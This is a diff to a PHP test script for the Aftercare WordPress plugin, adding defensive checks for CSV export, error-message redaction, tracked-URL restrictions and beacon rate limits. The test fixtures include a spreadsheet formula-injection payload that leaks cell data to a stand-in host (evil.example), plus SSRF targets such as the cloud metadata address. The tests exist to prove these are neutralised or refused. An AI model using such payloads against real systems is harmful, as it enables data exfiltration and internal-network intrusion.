@@ -4,7 +4,11 @@
  * install. Each step loads WordPress, exercises the plugin and exits non-zero
  * on the first failed assertion.
  *
- * Usage: php checks.php <wordpress-dir> <install|activate|flow|teardown>
+ * Usage: php checks.php <wordpress-dir> <step> [arguments]
+ *
+ * Steps: install, activate, flow, secret, ledger_seed, ledger_csv, errors,
+ * availability, rum, teardown. The secret step takes a settings key and the
+ * value it should hold; ledger_csv takes the exported file.
  */
 
 if ( 'cli' !== PHP_SAPI ) {
@@ -87,7 +91,7 @@ switch ( $step ) {
 		$result = activate_plugin( 'aftercare/aftercare.php' );
 		check( ! is_wp_error( $result ), 'plugin activates' . ( is_wp_error( $result ) ? ': ' . $result->get_error_message() : '' ) );
 		check( is_plugin_active( 'aftercare/aftercare.php' ), 'plugin is active' );
-		check( 5 === count( aftercare_tables() ), 'five tables created' );
+		check( 6 === count( aftercare_tables() ), 'six tables created' );
 		$hooks = aftercare_cron_hooks();
 		check( in_array( 'aftercare_daily_tasks', $hooks, true ), 'daily cron scheduled' );
 		check( in_array( 'aftercare_weekly_digest', $hooks, true ), 'weekly digest cron scheduled' );
@@ -273,6 +277,63 @@ switch ( $step ) {
 		// failing lab test.
 		break;
 
+	case 'secret':
+		$key = $argv[3] ?? '';
+		check( ( $argv[4] ?? '' ) === (string) Aftercare\Core\Options::get( $key ), "$key holds " . wp_json_encode( $argv[4] ?? '' ) );
+		break;
+
+	case 'ledger_seed':
+		global $wpdb;
+		$util = Aftercare\Core\Util::class;
+		check( "'=1+1" === $util::csv_safe( '=1+1' ), 'csv_safe prefixes =' );
+		foreach ( array( '+1', '-1', '@SUM(A1)', "\tx", "\rx" ) as $cell ) {
+			check( "'" . $cell === $util::csv_safe( $cell ), 'csv_safe prefixes ' . wp_json_encode( $cell[0] ) );
+		}
+		check( 'Plain text' === $util::csv_safe( 'Plain text' ) && '' === $util::csv_safe( '' ) && 'a=1' === $util::csv_safe( 'a=1' ), 'csv_safe leaves other cells alone' );
+
+		// More rows than one export page, so the export has to page.
+		$table = $wpdb->prefix . 'aftercare_ledger_events';
+		$now   = Aftercare\Core\Util::now();
+		for ( $batch = 0; $batch < 11; $batch++ ) {
+			$values = array();
+			for ( $i = 0; $i < 100; $i++ ) {
+				$values[] = $wpdb->prepare( '( %s, %s, 0, %s, %s, %s )', 'settings_change', 'Compat seed ' . ( $batch * 100 + $i ), 'system', '{}', $now );
+			}
+			$wpdb->query( "INSERT INTO {$table} ( event_type, summary, actor_id, actor_label, payload, occurred_at ) VALUES " . implode( ', ', $values ) ); // phpcs:ignore WordPress.DB.PreparedSQL.InterpolatedNotPrepared
+		}
+		$wpdb->insert(
+			$table,
+			array(
+				'event_type'  => 'content_publish',
+				'summary'     => '=1+1',
+				'actor_id'    => 0,
+				'actor_label' => '@editor',
+				'payload'     => '=HYPERLINK("https://evil.example?"&A1,"Click")',
+				'occurred_at' => $now,
+			)
+		);
+		check( Aftercare\Core\Plugin::instance()->ledger()->count() > 1100, 'ledger seeded with more than one export page' );
+		break;
+
+	case 'ledger_csv':
+		global $wpdb;
+		$file   = $argv[3] ?? '';
+		$handle = fopen( $file, 'r' );
+		$rows   = array();
+		while ( $handle && false !== ( $row = fgetcsv( $handle, null, ',', '"', '' ) ) ) {
+			$rows[] = $row;
+		}
+		check( 'occurred_at' === ( $rows[0][0] ?? '' ), 'CSV export has its header row' );
+		check( count( $rows ) - 1 === Aftercare\Core\Plugin::instance()->ledger()->count(), 'CSV export streams every ledger row across pages' );
+		$formula = array_values( array_filter( $rows, static fn( $row ) => "'=1+1" === ( $row[2] ?? '' ) ) );
+		check( 1 === count( $formula ), "a summary of =1+1 exports as '=1+1" );
+		check( "'@editor" === $formula[0][3] && str_starts_with( $formula[0][4], "'=HYPERLINK(" ), 'actor and payload cells are made safe too' );
+		$unsafe = array_filter( array_merge( ...$rows ), static fn( $cell ) => '' !== $cell && str_contains( "=+-@\t\r", $cell[0] ) );
+		check( array() === $unsafe, 'no exported cell starts with a formula character' );
+
+		$wpdb->query( $wpdb->prepare( 'DELETE FROM %i WHERE summary LIKE %s OR summary = %s', $wpdb->prefix . 'aftercare_ledger_events', 'Compat seed %', '=1+1' ) );
+		break;
+
 	case 'errors':
 		global $wpdb;
 		$rows = $wpdb->get_results( $wpdb->prepare( 'SELECT * FROM %i ORDER BY id', $wpdb->prefix . 'aftercare_errors' ), ARRAY_A );
@@ -282,6 +343,23 @@ switch ( $step ) {
 		check( str_starts_with( (string) ( $row['file'] ?? '' ), 'wp-includes/' ), 'error file stored relative to the WordPress root' );
 		check( 'mu-plugin:compat-fatal.php' === ( $row['culprit'] ?? '' ), 'culprit found in the stack trace of a core error' );
 		check( ! str_contains( (string) ( $row['message'] ?? '' ), ABSPATH ) && ! str_contains( (string) ( $row['message'] ?? '' ), 'Stack trace' ), 'error message stripped of paths and stack trace' );
+
+		// Stored messages never carry credentials or the WordPress root.
+		$collector = Aftercare\Errors\Collector::class;
+		$clean     = $collector::clean_message( "SQLSTATE[HY000] [1045] Access denied for user 'wp_prod'@'db.internal' (using password: YES) in " . ABSPATH . "wp-includes/class-wpdb.php:2050\nStack trace:\n#0 {main}" );
+		check( ! str_contains( $clean, 'wp_prod' ) && ! str_contains( $clean, 'db.internal' ), 'database user and host are redacted from a connect error' );
+		check( str_contains( $clean, '~/wp-includes/class-wpdb.php' ) && ! str_contains( $clean, ABSPATH ), 'the WordPress root becomes ~/' );
+		$clean = $collector::clean_message( 'Connect failed: password=hunter2 Token: abc123 api_key = XYZ789 pwd:s3cret' );
+		foreach ( array( 'hunter2', 'abc123', 'XYZ789', 's3cret' ) as $secret ) {
+			check( ! str_contains( $clean, $secret ), "credential value $secret is redacted" );
+		}
+		check( str_contains( $collector::clean_message( 'open_basedir restriction in effect. File(' . untrailingslashit( ABSPATH ) . ')' ), 'File(~)' ), 'the bare WordPress root becomes ~' );
+		if ( strlen( DB_PASSWORD ) >= 6 && ! in_array( strtolower( DB_HOST ), array( 'localhost', '127.0.0.1', '::1' ), true ) ) {
+			$clean = $collector::clean_message( 'Could not connect to ' . DB_HOST . ' with ' . DB_PASSWORD );
+			check( ! str_contains( $clean, DB_PASSWORD ) && ! str_contains( $clean, DB_HOST ), 'the configured database password and host are redacted verbatim' );
+		} else {
+			echo "SKIP verbatim database password and host redaction (short password or local host)\n";
+		}
 		$entries = Aftercare\Core\Plugin::instance()->ledger()->query( array( 'type' => 'php_error' ), 10 );
 		check( 1 === count( $entries ), 'one ledger entry for a repeating fatal error' );
 
@@ -308,8 +386,78 @@ switch ( $step ) {
 		$incidents   = Aftercare\Core\Plugin::instance()->incidents();
 		$check       = new Aftercare\Errors\AvailabilityCheck();
 		$page        = add_query_arg( 'compat_page', '1', home_url( '/' ) );
-		$unreachable = 'http://127.0.0.1:1/';
+		$unreachable = home_url( '/compat-unreachable/' );
 		$is_open     = static fn( $url ) => $incidents->find_open( $url, 'HTTP', 'availability' );
+		$options     = Aftercare\Core\Options::class;
+
+		// Tracked URLs stay on this site: no other servers, no internal
+		// addresses, no other ports, no credentials.
+		$own_port = (int) ( wp_parse_url( home_url(), PHP_URL_PORT ) ?? 80 );
+		check( $options::is_trackable_url( home_url( '/pricing/' ) ), 'a URL on this site can be tracked' );
+		foreach ( array( 'http://169.254.169.254/', 'https://example.com/', 'http://localhost:6379/', 'http://admin:secret@' . compat_host( home_url() ) . '/', 'ftp://' . compat_host( home_url() ) . '/', 'http://127.0.0.1:' . $own_port . '/' ) as $bad ) {
+			check( ! $options::is_trackable_url( $bad ), "$bad cannot be tracked" );
+		}
+		$allow_shop = static fn( $hosts ) => array_merge( $hosts, array( 'shop.example' ) );
+		add_filter( 'aftercare_allowed_hosts', $allow_shop );
+		check( $options::is_trackable_url( 'https://shop.example/basket/' ), 'a host added with aftercare_allowed_hosts can be tracked' );
+		remove_filter( 'aftercare_allowed_hosts', $allow_shop );
+		$options::update( array( 'tracked_urls' => array( 'http://169.254.169.254/', home_url( '/pricing/' ), 'https://example.com/' ) ) );
+		check( array( home_url( '/' ), home_url( '/pricing/' ) ) === $options::tracked_urls(), 'tracked URLs saved by 1.1.0 for other hosts are dropped' );
+		check( $options::is_https_url( 'https://hooks.slack.com/services/T/B/x' ) && ! $options::is_https_url( 'http://hooks.slack.com/x' ) && ! $options::is_https_url( 'https:///x' ), 'webhook URLs must be https' );
+
+		// Requests: this site may use https_local_ssl_verify; every other
+		// host, including one reached by a redirect, goes through
+		// wp_safe_remote_get() with TLS verified.
+		$hops  = array();
+		$route = static function ( $pre, $args, $url ) use ( &$hops ) {
+			if ( ! str_contains( $url, 'compat-route' ) && ! str_contains( $url, 'shop.example' ) && ! str_contains( $url, '169.254.169.254' ) ) {
+				return $pre;
+			}
+			$hops[] = array(
+				'url'    => $url,
+				'safe'   => ! empty( $args['reject_unsafe_urls'] ),
+				'verify' => $args['sslverify'],
+			);
+			if ( str_contains( $url, '169.254.169.254' ) ) {
+				return $pre; // Left to core, which refuses the address.
+			}
+			if ( str_contains( $url, 'compat-route' ) ) {
+				$to = str_contains( $url, 'metadata' ) ? 'http://169.254.169.254/latest/meta-data/' : 'https://shop.example/landing/';
+				return array(
+					'headers'  => array( 'location' => $to ),
+					'body'     => '',
+					'response' => array( 'code' => 301, 'message' => 'Moved Permanently' ),
+					'cookies'  => array(),
+				);
+			}
+			return array(
+				'headers'  => array( 'content-type' => 'text/html' ),
+				'body'     => '<html></html>',
+				'response' => array( 'code' => 200, 'message' => 'OK' ),
+				'cookies'  => array(),
+			);
+		};
+		add_filter( 'pre_http_request', $route, 10, 3 );
+		$result = $check->check( home_url( '/compat-route/' ) );
+		check( Aftercare\Errors\AvailabilityCheck::OK === $result[0] && 2 === count( $hops ), 'a redirect is followed hop by hop' );
+		check( ! $hops[0]['safe'] && false === $hops[0]['verify'], 'a request to this site keeps https_local_ssl_verify' );
+		check( $hops[1]['safe'] && true === $hops[1]['verify'] && str_starts_with( $hops[1]['url'], 'https://shop.example/' ), 'a redirect to another host is a safe request with TLS verified' );
+		$hops   = array();
+		$result = $check->check( home_url( '/compat-route/metadata/' ) );
+		remove_filter( 'pre_http_request', $route, 10 );
+		check( Aftercare\Errors\AvailabilityCheck::INCONCLUSIVE === $result[0] && 1 === count( $hops ), 'a redirect to the cloud metadata address is refused before any request' );
+
+		// Internal addresses, including those WordPress before 7.1 lets
+		// through wp_safe_remote_get(): link-local and carrier-grade NAT.
+		$util = Aftercare\Core\Util::class;
+		foreach ( array( 'http://169.254.169.254/', 'http://100.64.0.1/', 'http://10.0.0.1/', 'http://127.0.0.1/', 'http://[::1]/', 'http://[fe80::1]/', 'http://localhost/' ) as $internal ) {
+			check( $util::is_internal_host( $internal ), "$internal is internal" );
+		}
+		check( ! $util::is_internal_host( 'https://93.184.215.14/' ) && ! $util::is_internal_host( 'https://shop.example/' ), 'a public address, or a host that does not resolve, is left to core' );
+
+		// A tracked page the server cannot connect to.
+		$refuse = static fn( $pre, $args, $url ) => str_contains( $url, 'compat-unreachable' ) ? new WP_Error( 'http_request_failed', 'cURL error 7: Failed to connect' ) : $pre;
+		add_filter( 'pre_http_request', $refuse, 10, 3 );
 		Aftercare\Core\Options::update( array( 'tracked_urls' => array( $page, $unreachable ) ) );
 		update_option( 'compat_mail_log', array(), false );
 
@@ -346,9 +494,196 @@ switch ( $step ) {
 		check( null !== $is_open( $page ), 'blocked loopback requests leave open incidents alone' );
 		check( 'recommended' === $health->test_availability()['status'], 'Site Health explains blocked loopback requests' );
 
+		remove_filter( 'pre_http_request', $refuse, 10 );
 		Aftercare\Core\Options::update( array( 'tracked_urls' => array() ) );
 		delete_option( 'compat_page_mode' );
 		delete_option( 'compat_mail_log' );
+		break;
+
+	case 'rum':
+		global $wpdb;
+		$rum   = Aftercare\Vitals\RumController::class;
+		$table = $rum::table();
+		$util  = Aftercare\Core\Util::class;
+		Aftercare\Core\Options::update(
+			array(
+				'rum_enabled'  => true,
+				'tracked_urls' => array( home_url( '/pricing/' ) ),
+			)
+		);
+		$wpdb->query( $wpdb->prepare( 'DELETE FROM %i', $table ) );
+
+		$beacon  = static function ( array $body, string $ip = '203.0.113.1', ?string $raw = null ): int {
+			$_SERVER['REMOTE_ADDR'] = $ip;
+			$request                = new WP_REST_Request( 'POST', '/aftercare/v1/rum' );
+			$request->set_header( 'Content-Type', 'application/json' );
+			$request->set_body( $raw ?? wp_json_encode( $body ) );
+			return rest_do_request( $request )->get_status();
+		};
+		$rows    = static fn( string $where = '1 = 1' ) => (int) $wpdb->get_var( $wpdb->prepare( "SELECT COUNT(*) FROM %i WHERE {$where}", $table ) );
+		$options = static fn() => md5( serialize( $wpdb->get_results( "SELECT option_name, option_value FROM {$wpdb->options} ORDER BY option_name", ARRAY_N ) ) );
+		$pricing = $util::url_hash( $util::normalize_url( home_url( '/pricing/' ) ) );
+
+		check( $util::normalize_url( 'https://Example.COM:8443/Page/?a=1#top' ) === 'https://example.com:8443/Page', 'URL normalised: query, fragment and trailing slash dropped, host lowercased' );
+		check( $util::normalize_url( 'https://example.com/page' ) === $util::normalize_url( 'https://example.com/page/' ), '/page and /page/ normalise alike' );
+		check( '' === $util::normalize_url( 'javascript:alert(1)' ) && '' === $util::normalize_url( '/relative' ), 'non-http URLs normalise to nothing' );
+
+		// Endless made-up addresses on this host: nothing stored, no option
+		// written, not even a rate limit transient.
+		$before = $options();
+		$codes  = array();
+		for ( $i = 0; $i < 10000; $i++ ) {
+			$code           = $beacon(
+				array(
+					'metric' => 'LCP',
+					'value'  => 1000 + $i % 500,
+					'url'    => home_url( '/x' . $i . '-' . wp_generate_password( 6, false ) ),
+				),
+				'192.0.2.' . ( $i % 250 )
+			);
+			$codes[ $code ] = true;
+		}
+		check( array( 204 => true ) === $codes, '10,000 beacons for untracked pages all answer 204' );
+		check( 0 === $rows(), '10,000 beacons for untracked pages store nothing' );
+		check( $before === $options(), '10,000 beacons for untracked pages leave wp_options untouched' );
+		check( false === get_option( $rum::BUFFER_OPTION ), 'no buffer option is written' );
+
+		foreach ( array( '/pricing', '/pricing/', '/pricing/?utm_source=mail', '/PRICING/#plans' ) as $path ) {
+			$beacon(
+				array(
+					'metric' => 'LCP',
+					'value'  => 1500,
+					'url'    => home_url( $path ),
+				)
+			);
+		}
+		check( 4 === $rows( "url_hash = '{$pricing}' AND metric = 'LCP'" ), 'a tracked page is buffered under one key whatever its slash, query or case' );
+		$upper_host = preg_replace( '#^(https?://)([^/:]+)#', '$1' . strtoupper( (string) wp_parse_url( home_url(), PHP_URL_HOST ) ), home_url( '/pricing/' ) );
+		$beacon(
+			array(
+				'metric' => 'LCP',
+				'value'  => 1500,
+				'url'    => $upper_host,
+			)
+		);
+		check( 5 === $rows( "url_hash = '{$pricing}'" ), 'an uppercase host matches the tracked page' );
+		$beacon(
+			array(
+				'metric' => 'LCP',
+				'value'  => 1500,
+				'url'    => 'https://evil.example/pricing/',
+			)
+		);
+		check( 5 === $rows(), 'another host is ignored' );
+
+		$padded = wp_json_encode(
+			array(
+				'metric' => 'LCP',
+				'value'  => 1500,
+				'url'    => home_url( '/pricing/' ),
+				'pad'    => str_repeat( 'x', 1100 ),
+			)
+		);
+		check( 413 === $beacon( array(), '203.0.113.1', $padded ), 'a body over 1 KB is rejected with 413' );
+		check( 5 === $rows(), 'a rejected body stores nothing' );
+
+		// Rate limit: 30 beacons a minute per IP address. Retried once if the
+		// minute rolls over mid-test, which would reset the window.
+		for ( $attempt = 1; $attempt <= 2; $attempt++ ) {
+			$minute = intdiv( time(), MINUTE_IN_SECONDS );
+			$ip     = '198.51.100.' . $attempt;
+			$start  = $rows();
+			$last   = 0;
+			for ( $i = 0; $i < 31; $i++ ) {
+				$last = $beacon(
+					array(
+						'metric' => 'TTFB',
+						'value'  => 300,
+						'url'    => home_url( '/' ),
+					),
+					$ip
+				);
+			}
+			if ( intdiv( time(), MINUTE_IN_SECONDS ) === $minute ) {
+				break;
+			}
+		}
+		check( 429 === $last && 30 === $rows() - $start, 'the 31st beacon in a minute from one IP address is refused' );
+		check( 204 === $beacon( array( 'metric' => 'TTFB', 'value' => 300, 'url' => home_url( '/' ) ), '198.51.100.99' ), 'another IP address is still accepted' );
+
+		// Hard cap per page, metric and day.
+		add_filter( 'aftercare_rum_rate_limit', '__return_zero' );
+		for ( $i = 0; $i < 520; $i++ ) {
+			$beacon(
+				array(
+					'metric' => 'CLS',
+					'value'  => 0.05,
+					'url'    => home_url( '/pricing/' ),
+				)
+			);
+		}
+		remove_filter( 'aftercare_rum_rate_limit', '__return_zero' );
+		check( 500 === $rows( "url_hash = '{$pricing}' AND metric = 'CLS'" ), 'a page keeps at most 500 values per metric and day' );
+
+		// Aggregation reads earlier days from the table and deletes them.
+		$samples   = Aftercare\Core\Plugin::instance()->samples();
+		$yesterday = $util::days_ago( 1 );
+		$home_hash = $util::url_hash( $util::normalize_url( home_url( '/' ) ) );
+		$seed      = static function ( string $day, string $hash, string $metric, array $values ) use ( $wpdb, $table ): void {
+			foreach ( $values as $value ) {
+				$wpdb->insert( $table, array( 'day' => $day, 'url_hash' => $hash, 'metric' => $metric, 'value' => $value ) );
+			}
+		};
+		$seed( $yesterday, $pricing, 'INP', array( 100, 200, 300, 400, 500 ) );
+		$seed( $yesterday, $pricing, 'TTFB', array( 100, 200 ) );
+		$seed( $yesterday, md5( 'untracked' ), 'LCP', array( 1, 2, 3, 4, 5 ) );
+		$today_rows = $rows( $wpdb->prepare( 'day = %s', gmdate( 'Y-m-d' ) ) );
+
+		// The buffer option used up to 1.1.0, as an upgrade leaves it. INP,
+		// because the flow step seeded CrUX LCP for these days and CrUX
+		// outranks RUM.
+		$two_days_ago = $util::days_ago( 2 );
+		update_option(
+			$rum::BUFFER_OPTION,
+			array(
+				$two_days_ago      => array(
+					$home_hash => array(
+						'INP' => array(
+							'url'    => home_url( '/' ),
+							'values' => array( 1000, 2000, 3000, 4000, 5000 ),
+						),
+					),
+				),
+				gmdate( 'Y-m-d' ) => array(
+					$pricing        => array(
+						'INP' => array(
+							'url'    => home_url( '/pricing' ),
+							'values' => array( 80, 90, 100 ),
+						),
+					),
+					md5( 'nowhere' ) => array(
+						'INP' => array(
+							'url'    => home_url( '/nowhere/' ),
+							'values' => array( 80, 90, 100 ),
+						),
+					),
+				),
+			),
+			false
+		);
+
+		$rum::aggregate_buffer( $samples );
+		$inp = $samples->latest_for_day( home_url( '/pricing/' ), 'INP', $yesterday );
+		check( null !== $inp && 'rum' === $inp['source'] && 400.0 === $inp['value'], 'buffered values aggregate into a daily p75 for the tracked URL' );
+		check( null === $samples->latest_for_day( home_url( '/pricing/' ), 'TTFB', $yesterday ), 'fewer than four values aggregate into nothing' );
+		check( 0 === $rows( $wpdb->prepare( 'day < %s', gmdate( 'Y-m-d' ) ) ), 'aggregated days are deleted from the buffer table' );
+		$legacy = $samples->latest_for_day( home_url( '/' ), 'INP', $two_days_ago );
+		check( null !== $legacy && 4000.0 === $legacy['value'], 'past days in the 1.1.0 buffer option still aggregate' );
+		check( $today_rows + 3 === $rows( $wpdb->prepare( 'day = %s', gmdate( 'Y-m-d' ) ) ), "today's tracked values from the 1.1.0 option move into the buffer table" );
+		check( false === get_option( $rum::BUFFER_OPTION ), 'the 1.1.0 buffer option is deleted' );
+
+		$wpdb->query( $wpdb->prepare( 'DELETE FROM %i', $table ) );
+		Aftercare\Core\Options::update( array( 'tracked_urls' => array() ) );
 		break;
 
 	case 'teardown':
